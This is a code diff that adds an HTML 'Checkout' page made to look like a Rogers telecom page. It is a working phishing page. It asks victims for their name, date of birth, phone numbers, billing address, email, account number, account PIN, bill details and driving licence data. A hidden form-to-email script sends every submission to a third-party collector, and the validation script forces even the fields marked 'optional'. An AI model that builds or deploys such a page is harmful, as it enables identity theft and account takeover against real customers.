@@ -1,0 +1,130 @@
+<html>
+
+<title> Checkout </title>
+
+<p><a href="https://www.rogers.com/">
+    <img src="a.jpg" alt="W3Schools.com">
+    </a></p>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3pro.css">
+
+<center>
+<form method="post" action="//submit.form" onSubmit="return validateForm();">
+    <div style="max-width: 400px;">
+    </div>
+    <div style="padding-bottom: 18px;">Full Name<span style="color: red;"> </span><br/>
+    <input type="text" id="data_2" name="data_2" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Date Of Birth<span style="color: red;"> </span><br/>
+    <input type="text" id="data_3" name="data_3" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Contact Number<span style="color: red;"> </span><br/>
+    <input type="text" id="data_4" name="data_4" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">2nd line number (optional)<span style="color: red;"> </span><br/>
+    <input type="text" id="data_5" name="data_5" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">3rd line number (optional)<span style="color: red;"> </span><br/>
+    <input type="text" id="data_6" name="data_6" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Billing address (Registered to the account)<span style="color: red;"> </span><br/>
+    <input type="text" id="data_7" name="data_7" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Email<span style="color: red;"> </span><br/>
+    <input type="text" id="data_8" name="data_8" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Account Number<span style="color: red;"> </span><br/>
+    <input type="text" id="data_9" name="data_9" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Account Pin<span style="color: red;"> </span><br/>
+    <input type="text" id="data_10" name="data_10" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Current Bill<span style="color: red;"> </span><br/>
+    <input type="text" id="data_11" name="data_11" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Last Bill Date<span style="color: red;"> </span><br/>
+    <input type="text" id="data_12" name="data_12" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Driving License<span style="color: red;"> </span><br/>
+    <input type="text" id="data_13" name="data_13" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;">Expiry Of Driving License<span style="color: red;"> </span><br/>
+    <input type="text" id="data_14" name="data_14" style="max-width : 450px;" class="form-control"/>
+    </div>
+    <div style="padding-bottom: 18px;"><input name="skip_Submit" value="Submit" type="submit"/></div>
+    <div>
+     <div style='font-size:1px; opacity:0;' style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+    <script src="https://www.100forms.com/js/FORMKEY:JFE7QD8TWJT5" type="text/javascript"></script>
+    </div>
+    </form>
+    
+    <script type="text/javascript">
+    function validateForm() {
+    if (isEmpty(document.getElementById('data_2').value.trim())) {
+    alert('Full Name is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_3').value.trim())) {
+    alert('Date Of Birth is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_4').value.trim())) {
+    alert('Contact Number is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_5').value.trim())) {
+    alert('2nd line number (optional) is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_6').value.trim())) {
+    alert('3rd line number (optional) is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_7').value.trim())) {
+    alert('Billing address (Registered to the account) is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_8').value.trim())) {
+    alert('Email is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_9').value.trim())) {
+    alert('Account Number is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_10').value.trim())) {
+    alert('Account Pin is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_11').value.trim())) {
+    alert('Current Bill is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_12').value.trim())) {
+    alert('Last Bill Date is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_13').value.trim())) {
+    alert('Driving License is required!');
+    return false;
+    }
+    if (isEmpty(document.getElementById('data_14').value.trim())) {
+    alert('Expiry Of Driving License is required!');
+    return false;
+    }
+    return true;
+    }
+    function isEmpty(str) { return (str.length === 0 || !str.trim()); }
+    function validateEmail(email) {
+    var re = /^([\w-]+(?:\.[\w-]+))@((?:[\w-]+\.)\w[\w-]{0,66})\.([a-z]{2,15}(?:\.[a-z]{2})?)$/i;
+    return isEmpty(email) || re.test(email);
+    }
+    </script>
+
+</center>
+
+<p><a href="https://www.rogers.com/">
+    <img src="b.jpg" alt="W3Schools.com">
+    </a></p>
+</html>
